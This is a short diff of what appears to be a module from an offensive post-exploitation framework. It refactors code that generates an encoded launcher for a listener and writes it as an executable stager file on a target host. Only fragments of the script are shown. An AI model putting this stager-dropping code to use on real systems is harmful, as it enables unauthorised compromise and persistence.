@@ -85,7 +85,8 @@ class Module:
         # generate the launcher code
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', encode=True, userAgent=userAgent, safeChecks=safeChecks)
         launcher = launcher.replace('"', '\\"')
-        script = '''
+        return (
+            '''
 import os
 from random import choice
 from string import ascii_uppercase
@@ -101,7 +102,8 @@ with open(bashlocation, 'w') as f:
     f.write(stager)
     f.close()
 os.chmod(bashlocation, 0755)
-''' % (launcher)
-        return script
+'''
+            % (launcher)
+        )
 
 
